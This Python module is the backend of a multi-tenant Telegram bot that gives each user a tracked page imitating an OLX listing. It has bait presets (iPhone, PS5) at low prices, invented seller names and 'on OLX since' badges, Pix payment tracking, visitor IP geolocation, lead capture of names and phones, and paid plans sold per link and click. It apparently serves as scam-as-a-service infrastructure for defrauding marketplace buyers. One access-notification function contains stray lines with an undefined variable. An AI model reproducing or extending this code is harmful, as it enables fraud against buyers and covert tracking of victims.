# -*- coding: utf-8 -*-
"""
OLPG MULTI-TENANT TELEGRAM WEBHOOK HANDLER
Cada usuario do Telegram recebe sua propria pagina criptografada + slug unico.
Integra com bot.py existente (crypto_engine, get_db, etc.)
"""
import os, json, secrets, time, datetime, logging
import requests

logger = logging.getLogger("OLPG_TG_WH")

TELEGRAM_TOKEN = os.environ.get("TELEGRAM_BOT_TOKEN", "").strip()  # SEGURO: sem fallback hardcoded
TELEGRAM_API   = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}"
BASE_URL        = (os.environ.get("BASE_URL") or os.environ.get("APP_URL") or os.environ.get("RENDER_EXTERNAL_URL") or "https://olx-9ee8.onrender.com").rstrip('/')

# ─── RAW TELEGRAM API ─────────────────────────────────────────────────────────
def _tg(method, data):
    try:
        r = requests.post(f"{TELEGRAM_API}/{method}", json=data, timeout=10)
        return r.json()
    except Exception as e:
        logger.error(f"[TG] {method}: {e}")
        return {}

def send_msg(chat_id, text, markup=None, pm="HTML"):
    p = {"chat_id": chat_id, "text": text, "parse_mode": pm}
    if markup: p["reply_markup"] = markup
    return _tg("sendMessage", p)

def edit_msg(chat_id, msg_id, text, markup=None, pm="HTML"):
    p = {"chat_id": chat_id, "message_id": msg_id, "text": text, "parse_mode": pm}
    if markup: p["reply_markup"] = markup
    return _tg("editMessageText", p)

def answer_cb(cb_id, text="", alert=False):
    return _tg("answerCallbackQuery", {"callback_query_id": cb_id, "text": text, "show_alert": alert})

def set_webhook(url):
    return _tg("setWebhook", {"url": url, "drop_pending_updates": True})

def delete_webhook():
    return _tg("deleteWebhook", {"drop_pending_updates": True})

# ─── KEYBOARDS ────────────────────────────────────────────────────────────────
def _kb(rows): return {"inline_keyboard": rows}

def kb_main(tg_id=0):
    base = BASE_URL.rstrip('/')
    token = ""
    if tg_id > 0:
        try:
            import bot as _ab
            token = _ab.generate_admin_token(tg_id)
        except Exception:
            pass
    admin_url = f"{base}/admin?token={token}" if token else f"{base}/admin"
    return _kb([
        [{"text": "💰 Abrir Carteira / Painel OLX", "web_app": {"url": admin_url}}],
        [{"text": "📊 Minhas Stats", "callback_data": "m_stats"}, {"text": "📋 Eventos", "callback_data": "m_events"}],
        [{"text": "⚙️ Configurar Página", "callback_data": "m_config"}, {"text": "🔗 Meu Link", "callback_data": "m_link"}],
        [{"text": "✨ Modelos Prontos (Presets)", "callback_data": "m_presets"}, {"text": "🤖 Assistente IA", "callback_data": "m_ai"}],
        [{"text": "👥 Sessões", "callback_data": "m_sessions"}, {"text": "🔄 Atualizar", "callback_data": "m_refresh"}],
        [{"text": "❓ Ajuda", "callback_data": "m_help"}],
    ])

def kb_presets():
    return _kb([
        [{"text":"📱 iPhone 11 64GB (R$ 630)","callback_data":"p_iphone11"}],
        [{"text":"🎮 PlayStation 5 Digital (R$ 2.450)","callback_data":"p_ps5"}],
        [{"text":"💻 Notebook Dell i7 16GB (R$ 1.890)","callback_data":"p_dell"}],
        [{"text":"⌚ Apple Watch Series 8 (R$ 1.250)","callback_data":"p_watch"}],
        [{"text":"◀️ Menu Principal","callback_data":"m_back"}],
    ])

def kb_ai():
    return _kb([
        [{"text":"✍️ Gerar Descrição + Preço por IA","callback_data":"ai_gen"}],
        [{"text":"◀️ Menu Principal","callback_data":"m_back"}],
    ])

def kb_config():
    return _kb([
        [{"text":"📦 Nome do Produto","callback_data":"c_product_name"}],
        [{"text":"💰 Preço (R$)","callback_data":"c_product_price"},{"text":"🖼️ URL Imagem","callback_data":"c_product_image"}],
        [{"text":"📱 Número WhatsApp","callback_data":"c_whatsapp_number"},{"text":"💬 Mensagem WA","callback_data":"c_whatsapp_message"}],
        [{"text":"👤 Nome Vendedor","callback_data":"c_seller_name"},{"text":"📅 Membro Desde","callback_data":"c_seller_since"}],
        [{"text":"📝 Descrição","callback_data":"c_product_description"}],
        [{"text":"✨ Usar Modelo Pronto","callback_data":"m_presets"},{"text":"🤖 Assistente IA","callback_data":"m_ai"}],
        [{"text":"◀️ Menu Principal","callback_data":"m_back"}],
    ])

def kb_back(): return _kb([[{"text":"◀️ Menu Principal","callback_data":"m_back"}]])

# ─── DB HELPERS ───────────────────────────────────────────────────────────────
def _get_engine():
    import bot as _b; return _b.crypto_engine

def _get_db():
    import bot as _b; return _b.get_db()

def _enc(v): return _get_engine().encrypt(str(v))
def _dec(t):
    v = _get_engine().decrypt(t)
    return str(v) if v is not None else ""

# ─── INIT TENANT TABLES ───────────────────────────────────────────────────────
def init_tenant_tables():
    conn = _get_db()
    conn.executescript("""
        CREATE TABLE IF NOT EXISTS tg_users (
            tg_id INTEGER PRIMARY KEY, username TEXT,
            slug TEXT UNIQUE NOT NULL, created_at REAL NOT NULL
        );
        CREATE TABLE IF NOT EXISTS tg_config (
            tg_id INTEGER NOT NULL, key TEXT NOT NULL,
            value_enc TEXT NOT NULL, updated_at REAL NOT NULL,
            PRIMARY KEY (tg_id, key)
        );
        CREATE TABLE IF NOT EXISTS tg_events (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            tg_id INTEGER NOT NULL, slug TEXT NOT NULL,
            event_type TEXT NOT NULL, session_id TEXT, ip TEXT,
            data_enc TEXT, created_at REAL NOT NULL
        );
        CREATE TABLE IF NOT EXISTS tg_sessions (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            tg_id INTEGER NOT NULL, slug TEXT NOT NULL,
            session_id TEXT NOT NULL, ip TEXT, ua TEXT,
            entered_at REAL, left_at REAL, converted INTEGER DEFAULT 0
        );
        CREATE TABLE IF NOT EXISTS tg_states (
            chat_id INTEGER PRIMARY KEY, state TEXT NOT NULL, updated_at REAL NOT NULL
        );
        CREATE TABLE IF NOT EXISTS tg_profiles (
            tg_id INTEGER PRIMARY KEY,
            display_name TEXT, avatar_url TEXT, bio TEXT, contact TEXT, updated_at REAL NOT NULL
        );
        CREATE TABLE IF NOT EXISTS tg_log_channels (
            channel_key TEXT PRIMARY KEY,
            chat_id INTEGER NOT NULL,
            title TEXT,
            updated_at REAL NOT NULL
        );
        CREATE TABLE IF NOT EXISTS tenant_products (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            tg_id INTEGER NOT NULL,
            product_code TEXT UNIQUE NOT NULL,
            title TEXT NOT NULL,
            price TEXT NOT NULL,
            old_price TEXT,
            description TEXT,
            image_url TEXT,
            image1 TEXT, image2 TEXT, image3 TEXT,
            created_at REAL NOT NULL
        );
        CREATE TABLE IF NOT EXISTS tg_plans (
            tg_id INTEGER PRIMARY KEY,
            plan_key TEXT NOT NULL DEFAULT 'free',
            max_links INTEGER NOT NULL DEFAULT 1,
            max_clicks_month INTEGER NOT NULL DEFAULT 500,
            updated_at REAL NOT NULL
        );
        CREATE INDEX IF NOT EXISTS idx_tp_tgid  ON tenant_products(tg_id);
        CREATE INDEX IF NOT EXISTS idx_tp_code  ON tenant_products(product_code);
        CREATE INDEX IF NOT EXISTS idx_tge_id   ON tg_events(tg_id, created_at);
        CREATE INDEX IF NOT EXISTS idx_tgs_id   ON tg_sessions(tg_id, entered_at);
        CREATE INDEX IF NOT EXISTS idx_tg_slug  ON tg_users(slug);
    """)
    # ── Migração segura: adiciona colunas de modo taxa se ainda não existirem ──
    _safe_add_column(conn, "tenant_products", "shipping_mode",   "TEXT NOT NULL DEFAULT 'full'")
    _safe_add_column(conn, "tenant_products", "shipping_fee",    "TEXT NOT NULL DEFAULT '19.90'")
    _safe_add_column(conn, "tenant_products", "shipping_coupon", "TEXT NOT NULL DEFAULT ''")
    _safe_add_column(conn, "tg_sessions",     "lat",  "TEXT")
    _safe_add_column(conn, "tg_sessions",     "lng",  "TEXT")
    _safe_add_column(conn, "tg_sessions",     "city_geo",   "TEXT")
    _safe_add_column(conn, "tg_sessions",     "country_geo","TEXT")
    conn.commit(); conn.close()

def _safe_add_column(conn, table: str, col: str, coltype: str):
    """Adiciona coluna na tabela sem falhar se já existir."""
    try:
        conn.execute(f"ALTER TABLE {table} ADD COLUMN {col} {coltype}")
    except Exception:
        pass  # coluna já existe

# ─── PLANOS POR ADMIN ─────────────────────────────────────────────────────────
PLAN_DEFINITIONS = {
    "free":      {"name": "Plano Free",      "max_links": 1,    "max_clicks_month": 500},
    "starter":   {"name": "Plano Starter",   "max_links": 5,    "max_clicks_month": 5000},
    "pro":       {"name": "Plano Pro",       "max_links": 20,   "max_clicks_month": 30000},
    "unlimited": {"name": "Plano Unlimited", "max_links": 9999, "max_clicks_month": 999999},
}

def get_user_plan(tg_id: int) -> dict:
    """Retorna o plano atual do admin."""
    conn = _get_db()
    r = conn.execute("SELECT plan_key, max_links, max_clicks_month FROM tg_plans WHERE tg_id=?", (tg_id,)).fetchone()
    conn.close()
    if r:
        pdef = PLAN_DEFINITIONS.get(r["plan_key"], PLAN_DEFINITIONS["free"])
        return {
            "key": r["plan_key"],
            "name": pdef["name"],
            "max_links": r["max_links"],
            "max_clicks_month": r["max_clicks_month"],
        }
    # Padrão: free
    pdef = PLAN_DEFINITIONS["free"]
    return {"key": "free", "name": pdef["name"], "max_links": pdef["max_links"], "max_clicks_month": pdef["max_clicks_month"]}

def set_user_plan(tg_id: int, plan_key: str) -> bool:
    """Altera o plano de um admin. Retorna True se ok."""
    if plan_key not in PLAN_DEFINITIONS:
        return False
    pdef = PLAN_DEFINITIONS[plan_key]
    conn = _get_db()
    conn.execute("""
        INSERT INTO tg_plans(tg_id, plan_key, max_links, max_clicks_month, updated_at) VALUES(?,?,?,?,?)
        ON CONFLICT(tg_id) DO UPDATE SET plan_key=excluded.plan_key,
            max_links=excluded.max_links, max_clicks_month=excluded.max_clicks_month,
            updated_at=excluded.updated_at
    """, (tg_id, plan_key, pdef["max_links"], pdef["max_clicks_month"], time.time()))
    conn.commit(); conn.close()
    return True

def check_click_limit(tg_id: int):
    """Verifica se o admin ainda tem cliques disponíveis no plano.
    Retorna: (allowed: bool, current_month: int, max: int)"""
    plan = get_user_plan(tg_id)
    max_clicks = plan["max_clicks_month"]
    # Conta eventos do mês atual
    import datetime as _dt
    now = time.time()
    month_start = _dt.datetime.now().replace(day=1, hour=0, minute=0, second=0, microsecond=0).timestamp()
    conn = _get_db()
    current = conn.execute(
        "SELECT COUNT(*) FROM tg_events WHERE tg_id=? AND event_type='PAGE_ENTRY' AND created_at>=?",
        (tg_id, month_start)
    ).fetchone()[0]
    conn.close()
    return (current < max_clicks), current, max_clicks

# ─── ALIASES PARA COMPATIBILIDADE COM app.py ──────────────────────────────────
def get_tenant_all_config(tg_id: int) -> dict:
    """Alias de get_all_cfg para compatibilidade com app.py."""
    return get_all_cfg(tg_id)

def set_tenant_config(tg_id: int, key: str, value: str):
    """Alias de set_cfg para compatibilidade com app.py."""
    return set_cfg(tg_id, key, value)

def get_tenant_stats(tg_id: int, hours: int) -> dict:
    """Alias de get_tg_stats para compatibilidade com app.py."""
    return get_tg_stats(tg_id, hours)

def get_global_stats(hours: int) -> dict:
    """Estatísticas globais de todos os admins (para o Admin Supremo)."""
    since = time.time() - hours * 3600
    conn  = _get_db()
    def c(et): return conn.execute(
        "SELECT COUNT(*) FROM tg_events WHERE event_type=? AND created_at>=?",
        (et, since)).fetchone()[0]
    entries   = c("PAGE_ENTRY"); click_buy = c("CLICK_BUY")
    pix       = c("PIX_GENERATED"); paid = c("PAYMENT_CONFIRMED")
    leads     = c("LEAD_CAPTURED")
    sess      = conn.execute("SELECT COUNT(*) FROM tg_sessions WHERE entered_at>=?", (since,)).fetchone()[0]
    conv      = conn.execute("SELECT COUNT(*) FROM tg_sessions WHERE converted=1 AND entered_at>=?", (since,)).fetchone()[0]
    admins    = conn.execute("SELECT COUNT(*) FROM tg_users").fetchone()[0]
    conn.close()
    return dict(
        entries=entries, click_buy=click_buy, pix_generated=pix,
        paid=paid, leads=leads, sessions=sess, converted=conv,
        conv_rate=round((conv/sess*100) if sess>0 else 0, 1),
        total_admins=admins, period_hours=hours
    )

def get_all_tenants() -> list:
    """Retorna todos os usuários/admins cadastrados."""
    conn = _get_db()
    rows = conn.execute(
        "SELECT tg_id, username, slug, created_at FROM tg_users ORDER BY created_at DESC"
    ).fetchall()
    conn.close()
    return [dict(r) for r in rows]

# ─── CANAIS DE LOGS DO ADMIN SUPREMO ──────────────────────────────────────────
def set_log_channel(channel_key: str, chat_id: int, title: str = ""):
    conn = _get_db()
    conn.execute("""
        INSERT INTO tg_log_channels(channel_key, chat_id, title, updated_at) VALUES(?,?,?,?)
        ON CONFLICT(channel_key) DO UPDATE SET chat_id=excluded.chat_id, title=excluded.title, updated_at=excluded.updated_at
    """, (channel_key, chat_id, title, time.time()))
    conn.commit(); conn.close()

def get_log_channels():
    conn = _get_db()
    rows = conn.execute("SELECT channel_key, chat_id, title FROM tg_log_channels").fetchall()
    conn.close()
    return {r["channel_key"]: {"chat_id": r["chat_id"], "title": r["title"]} for r in rows}

def notify_log_channel(channel_key: str, text: str, markup=None):
    channels = get_log_channels()
    ch = channels.get(channel_key) or channels.get('all')
    if ch and ch.get('chat_id'):
        send_msg(ch['chat_id'], text, markup=markup)
def notify_admin_access(admin_id: int, role: str, ip: str, user_agent: str):
    try:
        dt = datetime.datetime.now().strftime('%d/%m/%Y %H:%M:%S')
        role_label = 'ADMIN SUPREMO' if role == 'supreme_admin' else 'ADMIN'
        geo = get_ip_geolocation(ip)
        city = geo.get('city', 'Desconhecida')
        country = geo.get('country', 'BR')
        isp = geo.get('isp', 'Provedor')
        msg = f'<b>NOTIFICACAO DE ACESSO AO PAINEL WEB</b>\n\n<b>Admin ID:</b> <code>{admin_id}</code> ({role_label})\n<b>Data/Hora:</b> {dt}\n<b>IP:</b> <code>{ip}</code>\n<b>Localizacao:</b> {city}, {country} ({isp})\n<b>Dispositivo:</b> <code>{user_agent[:60]}</code>'
        notify_log_channel('system', msg)
    except Exception as e:
        logger.error(f'[NOTIFY ACCESS ERROR] {e}')

    channels = get_log_channels()
    ch = channels.get(channel_key) or channels.get("all")
    if ch and ch.get("chat_id"):
        send_msg(ch["chat_id"], text, markup=markup)

# ─── CATÁLOGO PROPRIO DE MULTI-PRODUTOS POR ADMIN ────────────────────────────
def create_tenant_product(tg_id: int, title: str, price: str, old_price="", description="", image_url="", image1="", image2="", image3=""):
    conn = _get_db()
    code = secrets.token_urlsafe(8).lower()
    conn.execute("""
        INSERT INTO tenant_products(tg_id, product_code, title, price, old_price, description, image_url, image1, image2, image3, created_at)
        VALUES(?,?,?,?,?,?,?,?,?,?,?)
    """, (tg_id, code, title, price, old_price, description, image_url, image1, image2, image3, time.time()))
    conn.commit(); conn.close()
    return code

def get_tenant_products(tg_id: int):
    conn = _get_db()
    rows = conn.execute("SELECT id, product_code, title, price, old_price, description, image_url, created_at FROM tenant_products WHERE tg_id=? ORDER BY id DESC", (tg_id,)).fetchall()
    conn.close()
    return [dict(r) for r in rows]

def get_product_by_code(code: str):
    conn = _get_db()
    r = conn.execute("SELECT * FROM tenant_products WHERE product_code=?", (code,)).fetchone()
    conn.close()
    return dict(r) if r else None

def delete_tenant_product(tg_id: int, product_code: str):
    conn = _get_db()
    conn.execute("DELETE FROM tenant_products WHERE tg_id=? AND product_code=?", (tg_id, product_code))
    conn.commit(); conn.close()

def update_tenant_product(tg_id: int, product_code: str, fields: dict) -> bool:
    """Atualiza campos de um produto (incluindo shipping_mode, shipping_fee, shipping_coupon)."""
    ALLOWED = {"title", "price", "old_price", "description", "image_url",
               "image1", "image2", "image3", "shipping_mode", "shipping_fee", "shipping_coupon"}
    updates = {k: v for k, v in fields.items() if k in ALLOWED}
    if not updates:
        return False
    cols = ", ".join(f"{k}=?" for k in updates)
    vals = list(updates.values()) + [tg_id, product_code]
    conn = _get_db()
    conn.execute(f"UPDATE tenant_products SET {cols} WHERE tg_id=? AND product_code=?", vals)
    conn.commit(); conn.close()
    return True

# ─── GEOLOCALIZACÃO REAL POR IP ───────────────────────────────────────────────────
_GEO_CACHE = {}  # {ip: {lat, lng, city, country, region, isp, ts}}

def get_ip_geolocation(ip: str) -> dict:
    """
    Geolocalização real por IP usando ip-api.com (gratuito, 45 req/min).
    Retorna lat, lng, cidade, estado, país, ISP.
    Cache de 6h por IP para não estourar o limite.
    """
    if not ip or ip in ('127.0.0.1', '::1', 'localhost'):
        return {"lat": None, "lng": None, "city": "Local", "region": "-", "country": "BR", "isp": "-"}
    cached = _GEO_CACHE.get(ip)
    if cached and time.time() - cached.get("ts", 0) < 21600:  # 6h cache
        return cached
    try:
        r = requests.get(
            f"http://ip-api.com/json/{ip}?fields=status,lat,lon,city,regionName,country,countryCode,isp,org",
            timeout=3
        )
        d = r.json()
        if d.get("status") == "success":
            geo = {
                "lat":     round(d.get("lat", 0), 5),
                "lng":     round(d.get("lon", 0), 5),
                "city":    d.get("city", ""),
                "region":  d.get("regionName", ""),
                "country": d.get("country", ""),
                "country_code": d.get("countryCode", "BR"),
                "isp":     d.get("isp") or d.get("org", ""),
                "ts":      time.time()
            }
            _GEO_CACHE[ip] = geo
            return geo
    except Exception as e:
        logger.warning(f"[GEO] {ip}: {e}")
    return {"lat": None, "lng": None, "city": "?", "region": "?", "country": "?", "isp": "?"}

def enrich_session_with_geo(tg_id: int, session_id: str, ip: str):
    """Salva lat/lng/city/country na sessão após geolocalizar."""
    geo = get_ip_geolocation(ip)
    if geo.get("lat") is None:
        return
    conn = _get_db()
    conn.execute(
        "UPDATE tg_sessions SET lat=?, lng=?, city_geo=?, country_geo=? WHERE tg_id=? AND session_id=?",
        (str(geo["lat"]), str(geo["lng"]), geo["city"], geo["country"], tg_id, session_id)
    )
    conn.commit(); conn.close()

def get_full_overview_for_supreme() -> dict:
    """Visão completa de todos os admins para o Admin Supremo."""
    conn = _get_db()
    users = conn.execute(
        "SELECT tg_id, username, slug, created_at FROM tg_users ORDER BY created_at DESC"
    ).fetchall()
    result = []
    for u in users:
        tid = u["tg_id"]
        plan = get_user_plan(tid)
        prof = get_tenant_profile(tid)
        ok_c, curr_c, max_c = check_click_limit(tid)
        stats_24h = get_tg_stats(tid, 24)
        stats_7d  = get_tg_stats(tid, 168)
        products  = conn.execute(
            "SELECT product_code, title, price, shipping_mode, shipping_fee FROM tenant_products WHERE tg_id=? ORDER BY id DESC",
            (tid,)
        ).fetchall()
        recent_leads = conn.execute(
            "SELECT data_enc, ip, created_at FROM tg_events WHERE tg_id=? AND event_type='LEAD_CAPTURED' ORDER BY created_at DESC LIMIT 5",
            (tid,)
        ).fetchall()
        leads_clean = []
        for lev in recent_leads:
            try:
                ld = json.loads(_dec(lev["data_enc"]))
            except Exception:
                ld = {}
            leads_clean.append({"ip": lev["ip"], "at": lev["created_at"], "name": ld.get("name","?"), "phone": ld.get("phone","")})
        result.append({
            "tg_id":    tid,
            "username": u["username"],
            "slug":     u["slug"],
            "created_at": u["created_at"],
            "profile":  {"display_name": prof.get("display_name",""), "bio": prof.get("bio",""), "contact": prof.get("contact","")},
            "plan":     plan,
            "usage":    {"current": curr_c, "max": max_c, "allowed": ok_c},
            "stats":    {"h24": stats_24h, "h7d": stats_7d},
            "products": [{"code": p["product_code"], "title": p["title"], "price": p["price"],
                          "shipping_mode": p["shipping_mode"], "shipping_fee": p["shipping_fee"]} for p in products],
            "recent_leads": leads_clean,
        })
    conn.close()
    return {"admins": result, "total": len(result)}

def get_tenant_profile(tg_id):
    conn = _get_db()
    r = conn.execute("SELECT tg_id, display_name, avatar_url, bio, contact, updated_at FROM tg_profiles WHERE tg_id=?", (tg_id,)).fetchone()
    conn.close()
    if r: return dict(r)
    return {"tg_id": tg_id, "display_name": f"Admin #{tg_id}", "avatar_url": "", "bio": "Admin OLPG", "contact": ""}

def set_tenant_profile(tg_id, display_name="", avatar_url="", bio="", contact=""):
    conn = _get_db()
    conn.execute("""
        INSERT INTO tg_profiles(tg_id, display_name, avatar_url, bio, contact, updated_at)
        VALUES(?,?,?,?,?,?)
        ON CONFLICT(tg_id) DO UPDATE SET
            display_name=excluded.display_name, avatar_url=excluded.avatar_url,
            bio=excluded.bio, contact=excluded.contact, updated_at=excluded.updated_at
    """, (tg_id, display_name, avatar_url, bio, contact, time.time()))
    conn.commit(); conn.close()

def get_all_tenant_profiles():
    conn = _get_db()
    rows = conn.execute("""
        SELECT u.tg_id, u.username, u.slug, p.display_name, p.avatar_url, p.bio, p.contact 
        FROM tg_users u LEFT JOIN tg_profiles p ON u.tg_id = p.tg_id 
        ORDER BY u.created_at DESC
    """).fetchall()
    conn.close()
    return [dict(r) for r in rows]

# ─── USER MANAGEMENT ──────────────────────────────────────────────────────────
def user_exists(tg_id):
    conn = _get_db()
    r = conn.execute("SELECT 1 FROM tg_users WHERE tg_id=?", (tg_id,)).fetchone()
    conn.close(); return r is not None

def ensure_user(tg_id, username):
    if not user_exists(tg_id):
        slug = secrets.token_urlsafe(10)
        conn = _get_db()
        conn.execute("INSERT OR IGNORE INTO tg_users(tg_id,username,slug,created_at) VALUES(?,?,?,?)",
                     (tg_id, username, slug, time.time()))
        conn.commit(); conn.close()

def get_slug(tg_id):
    conn = _get_db()
    r = conn.execute("SELECT slug FROM tg_users WHERE tg_id=?", (tg_id,)).fetchone()
    conn.close(); return r["slug"] if r else ""

def get_tg_id_by_slug(slug):
    conn = _get_db()
    r = conn.execute("SELECT tg_id FROM tg_users WHERE slug=?", (slug,)).fetchone()
    conn.close(); return r["tg_id"] if r else None

# ─── PER-USER CONFIG ──────────────────────────────────────────────────────────
def get_cfg(tg_id, key, default=""):
    conn = _get_db()
    r = conn.execute("SELECT value_enc FROM tg_config WHERE tg_id=? AND key=?", (tg_id, key)).fetchone()
    conn.close()
    return (_dec(r["value_enc"]) or default) if r else default

def set_cfg(tg_id, key, value):
    conn = _get_db()
    conn.execute("INSERT OR REPLACE INTO tg_config(tg_id,key,value_enc,updated_at) VALUES(?,?,?,?)",
                 (tg_id, key, _enc(value), time.time()))
    conn.commit(); conn.close()

DEFAULTS = {
    "product_name":"iPhone 11 64GB Branco",
    "product_price":"630.00",
    "product_description":"iPhone 11 com 64GB de armazenamento na cor branca, seminovo em perfeito estado de conservação. Saúde da bateria em 86%. Acompanha caixa original e carregador.",
    "product_image":"https://images.unsplash.com/photo-1565849904461-04a58ad377e0?w=800&q=80",
    "product_image1":"","product_image2":"","product_image3":"",
    "whatsapp_number":"5511999999999",
    "whatsapp_message":"Olá! Vi seu anúncio na OLX e tenho interesse no produto.",
    "seller_name":"Carlos Eduardo","seller_status":"Último acesso há 15 minutos",
    "seller_since":"Na OLX desde 2021",
}

PRESET_MODELS = {
    "p_iphone11": {
        "product_name": "iPhone 11 64GB Branco (Seminovo)",
        "product_price": "630.00",
        "product_description": "iPhone 11 com 64GB de armazenamento na cor branca. Bateria em 87% de saúde. Sem trincos, sem marcas de uso profundas. Acompanha carregador e capa de silicone.",
        "product_image": "https://images.unsplash.com/photo-1565849904461-04a58ad377e0?w=800&q=80",
        "seller_name": "Gabriel Souza", "seller_since": "Na OLX desde 2021"
    },
    "p_ps5": {
        "product_name": "PlayStation 5 Edição Digital + 2 Controles",
        "product_price": "2450.00",
        "product_description": "Console PS5 sem leitor de disco, 825GB SSD. Acompanha 2 controles DualSense originais (um branco e um preto), cabos e base. Funcionando 100%, sem nenhum detalhe.",
        "product_image": "https://images.unsplash.com/photo-1606813907291-d86efa9b94db?w=800&q=80",
        "seller_name": "Rodrigo Mendes", "seller_since": "Na OLX desde 2020"
    },
    "p_dell": {
        "product_name": "Notebook Dell Inspiron i7 16GB SSD 512GB",
        "product_price": "1890.00",
        "product_description": "Notebook Dell Inspiron Intel Core i7 de 11ª Geração, 16GB de RAM e SSD de 512GB NVMe. Tela Full HD de 15.6 polegadas. Bateria dura em média 4 horas.",
        "product_image": "https://images.unsplash.com/photo-1588872657578-7efd1f1555ed?w=800&q=80",
        "seller_name": "Lucas Oliveira", "seller_since": "Na OLX desde 2019"
    },
    "p_watch": {
        "product_name": "Apple Watch Series 8 45mm Alumínio",
        "product_price": "1250.00",
        "product_description": "Apple Watch Series 8 GPS 45mm cor Meia-Noite. Na caixa com carregador por indução original e pulseira adicional. Saúde da bateria 92%.",
        "product_image": "https://images.unsplash.com/photo-1546868871-7041f2a55e12?w=800&q=80",
        "seller_name": "Matheus Lima", "seller_since": "Na OLX desde 2022"
    }
}

def get_all_cfg(tg_id):
    return {k: get_cfg(tg_id, k, fb) for k, fb in DEFAULTS.items()}

# ─── STATS + EVENTS + SESSIONS ────────────────────────────────────────────────
def get_tg_stats(tg_id, hours):
    since = time.time() - hours * 3600
    conn  = _get_db()
    def c(et): return conn.execute(
        "SELECT COUNT(*) FROM tg_events WHERE tg_id=? AND event_type=? AND created_at>=?",
        (tg_id, et, since)).fetchone()[0]
    entries   = c("PAGE_ENTRY"); click_buy = c("CLICK_BUY")
    pix       = c("PIX_GENERATED"); paid = c("PAYMENT_CONFIRMED")
    leads     = c("LEAD_CAPTURED")
    sess = conn.execute("SELECT COUNT(*) FROM tg_sessions WHERE tg_id=? AND entered_at>=?", (tg_id, since)).fetchone()[0]
    conv = conn.execute("SELECT COUNT(*) FROM tg_sessions WHERE tg_id=? AND converted=1 AND entered_at>=?", (tg_id, since)).fetchone()[0]
    conn.close()
    return dict(entries=entries, click_buy=click_buy, pix_generated=pix, paid=paid,
                leads=leads, sessions=sess, converted=conv,
                conv_rate=round((conv/sess*100) if sess>0 else 0, 1))

def get_tg_events(tg_id, limit=10):
    conn = _get_db()
    rows = conn.execute(
        "SELECT event_type,session_id,ip,data_enc,created_at FROM tg_events WHERE tg_id=? ORDER BY created_at DESC LIMIT ?",
        (tg_id, limit)).fetchall()
    conn.close()
    result = []
    for row in rows:
        raw = _get_engine().decrypt(row["data_enc"]) if row["data_enc"] else {}
        data = raw if isinstance(raw, dict) else {}
        result.append(dict(type=row["event_type"], session=row["session_id"],
                           ip=row["ip"], data=data, ts=row["created_at"]))
    return result

def get_tg_sessions(tg_id, limit=10):
    conn = _get_db()
    rows = conn.execute(
        "SELECT session_id,ip,entered_at,left_at,converted FROM tg_sessions WHERE tg_id=? ORDER BY entered_at DESC LIMIT ?",
        (tg_id, limit)).fetchall()
    conn.close(); return [dict(r) for r in rows]

def log_tg_event(tg_id, slug, event_type, session_id, ip, data):
    import bot as _b
    conn = _get_db()
    conn.execute("INSERT INTO tg_events(tg_id,slug,event_type,session_id,ip,data_enc,created_at) VALUES(?,?,?,?,?,?,?)",
                 (tg_id, slug, event_type, session_id, ip, _b.encrypt_data(data), time.time()))
    conn.commit(); conn.close()

def upsert_tg_session(tg_id, slug, session_id, ip, ua):
    conn = _get_db()
    if not conn.execute("SELECT 1 FROM tg_sessions WHERE tg_id=? AND session_id=?", (tg_id, session_id)).fetchone():
        conn.execute("INSERT INTO tg_sessions(tg_id,slug,session_id,ip,ua,entered_at) VALUES(?,?,?,?,?,?)",
                     (tg_id, slug, session_id, ip, ua, time.time()))
    conn.commit(); conn.close()

def mark_tg_converted(tg_id, session_id):
    conn = _get_db()
    conn.execute("UPDATE tg_sessions SET converted=1 WHERE tg_id=? AND session_id=?", (tg_id, session_id))
    conn.commit(); conn.close()

# ─── CONVERSATION STATE ───────────────────────────────────────────────────────
def set_state(chat_id, state):
    conn = _get_db()
    conn.execute("INSERT OR REPLACE INTO tg_states(chat_id,state,updated_at) VALUES(?,?,?)", (chat_id, state, time.time()))
    conn.commit(); conn.close()

def get_state(chat_id):
    conn = _get_db()
    r = conn.execute("SELECT state FROM tg_states WHERE chat_id=?", (chat_id,)).fetchone()
    conn.close(); return r["state"] if r else ""

def clear_state(chat_id):
    conn = _get_db()
    conn.execute("DELETE FROM tg_states WHERE chat_id=?", (chat_id,))
    conn.commit(); conn.close()

# ─── FORMATTERS ───────────────────────────────────────────────────────────────
def _ts(ts):
    if not ts: return ""
    return datetime.datetime.fromtimestamp(ts).strftime("%d/%m %H:%M")

def _ev(t):
    return {"PAGE_ENTRY":"👁 Visita","CLICK_BUY":"🛒 Compra","LEAD_CAPTURED":"📝 Lead",
            "PIX_GENERATED":"💸 Pix","PAYMENT_CONFIRMED":"✅ Pago","CLICK_CHAT":"💬 Chat",
            "WHATSAPP_REDIRECT":"📲 WhatsApp"}.get(t, t)

# ─── CONFIG FIELDS ────────────────────────────────────────────────────────────
CFG_FIELDS = {
    "c_product_name":        ("product_name",        "📦 <b>Nome do Produto</b>\n\nEnvie o novo nome:"),
    "c_product_price":       ("product_price",        "💰 <b>Preço</b>\n\nDigite o valor (ex: <code>630,00</code> ou <code>630.00</code>):"),
    "c_product_image":       ("product_image",        "🖼️ <b>URL da Imagem</b>\n\nCole o link da imagem (começando com http:// ou https://):"),
    "c_product_description": ("product_description",  "📝 <b>Descrição</b>\n\nEnvie a descrição do produto:"),
    "c_whatsapp_number":     ("whatsapp_number",      "📱 <b>WhatsApp</b>\n\nDigite o número com DDD (ex: <code>11999999999</code> ou <code>5511999999999</code>):"),
    "c_whatsapp_message":    ("whatsapp_message",     "💬 <b>Mensagem WhatsApp</b>\n\nTexto inicial ao clicar em Falar:"),
    "c_seller_name":         ("seller_name",          "👤 <b>Nome do Vendedor</b>\n\nNome que aparece na página:"),
    "c_seller_since":        ("seller_since",         "📅 <b>Membro Desde</b>\n\nEx: <code>Na OLX desde janeiro de 2022</code>"),
}

# ─── MOTORES DE VALIDAÇÃO ESTREITA E IA DE CONTEÚDO ───────────────────────────
import re

def clean_and_validate_price(val_str: str) -> str:
    """Normaliza preços sem erros (ex: 'R$ 1.250,00' -> '1250.00')."""
    s = val_str.replace("R$", "").replace(" ", "").strip()
    if "," in s and "." in s:
        s = s.replace(".", "").replace(",", ".")
    elif "," in s:
        s = s.replace(",", ".")
    m = re.search(r"(\d+(\.\d+)?)", s)
    if m:
        try:
            val = float(m.group(1))
            return f"{val:.2f}"
        except ValueError:
            pass
    return "630.00"

